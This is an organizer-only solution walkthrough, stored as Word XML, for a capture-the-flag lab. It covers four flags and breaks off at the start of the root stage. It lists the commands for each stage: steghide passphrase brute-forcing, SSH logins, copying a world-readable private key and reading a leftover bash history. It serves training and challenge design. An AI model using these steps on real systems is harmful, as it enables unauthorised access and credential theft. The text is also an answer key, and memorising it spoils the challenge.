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Organizer Solutions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94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9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472"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>Figure: the intended player path, flag by flag</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Full solve walkthrough, organizer-only. Never share this file or its contents with players.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Flags are generated randomly on every install (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="7A1F2B"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>CTF{&lt;32 hex chars&gt;}</w:t>
      </w:r>
      <w:r>
        <w:t>, base64-encoded wherever they're stored). To see the actual current values for a live install:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:t>sudo cat /opt/ctf/.organizer/secrets.env</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>or validate them in place without printing plaintext into your terminal history:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:t>sudo bash scripts/check_flags.sh</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Everything below uses the fixed values from </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="7A1F2B"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>scripts/config.sh</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (paths, usernames, port, hidden directory names) — those don't change between installs, only the flags/passwords do.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="B8AFA0"/>
        </w:pBdr>
        <w:spacing w:after="280"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>FLAG 1 — Website / robots.txt</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Discovery</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="7A1F2B"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>GET /robots.txt</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> on the website lists a disallowed path.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Commands</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:t>curl http://&lt;IP&gt;/robots.txt</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:t>curl http://&lt;IP&gt;/hidden/classified-briefing-7f3a2b/</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Expected output</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="7A1F2B"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>robots.txt</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> shows </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="7A1F2B"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Disallow: /hidden/classified-briefing-7f3a2b/</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. The page at that path is a plausible internal "briefing archive" — the flag sits at the very bottom, after enough legitimate-looking content that the player has to scroll, as </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="7A1F2B"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Ref: &lt;base64&gt;</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Encoding</w:t>
      </w:r>
      <w:r>
        <w:t>: Base64.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Decoding</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="7A1F2B"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>echo '&lt;base64&gt;' | base64 -d</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Flag</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: see </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="7A1F2B"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>FLAG1</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="7A1F2B"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>secrets.env</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>FLAG 2 — Agent99</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Discovery</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: The steghide passphrase (real entry in your </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="7A1F2B"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>rockyou.txt</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, configured as </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="7A1F2B"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>STEGHIDE_PASSPHRASE</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="7A1F2B"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>scripts/config.sh</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">) must be brute-forced against the homepage image, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="7A1F2B"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>assets/team-photo.jpg</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Commands</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:t>curl -O http://&lt;IP&gt;/assets/team-photo.jpg</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:t>steghide extract -sf team-photo.jpg   # prompts for passphrase, no -xf given</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:t>cat Agent99.txt</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:t>echo '&lt;base64 from Agent99.txt&gt;' | base64 -d</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:t>ssh -p 2222 Agent99@&lt;IP&gt;</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:t>ls -la ~</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:t>cat ~/.net-cache.idx</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Expected output</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: extracting without </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="7A1F2B"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>-xf</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> restores steghide's original embedded filename, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="7A1F2B"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Agent99.txt</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — this is deliberate: the filename itself is how the player learns the SSH username, since the file's content never names </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="7A1F2B"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Agent99</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> in plaintext, only holding a base64-encoded password. Once logged in, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="7A1F2B"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>ls -la</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> in the home directory shows </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="7A1F2B"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>README.txt</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="7A1F2B"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>.net-cache.idx</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — the latter has an </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="7A1F2B"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>entry_hash=&lt;base64&gt;</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> line.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Encoding</w:t>
      </w:r>
      <w:r>
        <w:t>: Base64 (both the SSH password and the flag).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Decoding</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="7A1F2B"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>echo '&lt;base64&gt;' | base64 -d</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Flag</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: see </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="7A1F2B"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>FLAG2</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="7A1F2B"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>secrets.env</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Hidden directory clue (bridges Flag 2 → Flag 3)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Discovery</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="7A1F2B"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>ls -la ~</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> alone won't show it if the player doesn't look closely; </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="7A1F2B"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>find ~ -maxdepth 1</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> or plain </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="7A1F2B"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>ls -la</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> reveals </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="7A1F2B"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>.cache-index/</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:t>cat ~/.cache-index/clue.dat | base64 -d</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Content</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (base64-encoded, not a flag): points the player at "what the system backs up" — i.e., towards </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="7A1F2B"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>/var/backups/</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>FLAG 3 — Backup</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Discovery</w:t>
      </w:r>
      <w:r>
        <w:t>: Following the hidden-directory clue toward backups:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:t>find /var/backups -maxdepth 1 -type d</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:left="340"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">This surfaces </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>two</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> candidates: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="7A1F2B"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>/var/backups/legacy-ops/</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (real) and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="7A1F2B"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>/var/backups/website-backup-2021/</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (rabbit hole #1 — see below). The real one is world-readable.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:t>cat /var/backups/legacy-ops/ops-notes.txt</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Expected output</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: A migration log plus an "Archive checksum" line containing the base64 flag, and a note pointing at </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="7A1F2B"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>keys/</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> for the Agent999 credential.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Encoding</w:t>
      </w:r>
      <w:r>
        <w:t>: Base64.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Decoding</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="7A1F2B"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>echo '&lt;base64&gt;' | base64 -d</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Flag</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: see </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="7A1F2B"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>FLAG3</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="7A1F2B"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>secrets.env</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>id_rsa (bridges Flag 3 → Agent999)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Discovery</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:t>ls -la /var/backups/legacy-ops/keys/</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:left="340"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">A file named </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="7A1F2B"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>legacy_agent999_access</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (not called </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="7A1F2B"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>id_rsa</w:t>
      </w:r>
      <w:r>
        <w:t>, but is one) — world-readable, which is the intended lax-permissions vulnerability.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Commands</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:t>scp -P 2222 Agent99@&lt;IP&gt;:/var/backups/legacy-ops/keys/legacy_agent999_access .</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:t>chmod 600 legacy_agent999_access   # ssh refuses group/world-readable keys</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:t>ssh -p 2222 -i legacy_agent999_access Agent999@&lt;IP&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>FLAG 4 — Agent999 .bash_history</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Discovery</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:t>cat ~/.bash_history</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Expected output</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: A realistic sequence of commands (checking the backup, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="7A1F2B"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>sudo -l</w:t>
      </w:r>
      <w:r>
        <w:t>, disk usage, etc.) followed by:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:t>export LEGACY_TOKEN='&lt;base64&gt;'</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:t>echo $LEGACY_TOKEN | base64 -d</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:t>unset LEGACY_TOKEN</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:t>history -c</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:t>exit</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:left="340"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Note the file still shows all of this despite the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="7A1F2B"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>history -c</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — that command only clears the *in-memory* history for the session that ran it; it never rewrote the file on disk. That inconsistency is the intended "why is this still here" moment for this stage.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Encoding</w:t>
      </w:r>
      <w:r>
        <w:t>: Base64.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Decoding</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="7A1F2B"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>echo '&lt;base64&gt;' | base64 -d</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Flag</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: see </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="7A1F2B"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>FLAG4</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="7A1F2B"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>secrets.env</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>FLAG 5 — Root</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Discovery</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="7A1F2B"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>sudo -l</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> as </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="7A1F2B"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Agent999</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:t>sudo -l</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:left="340"/>
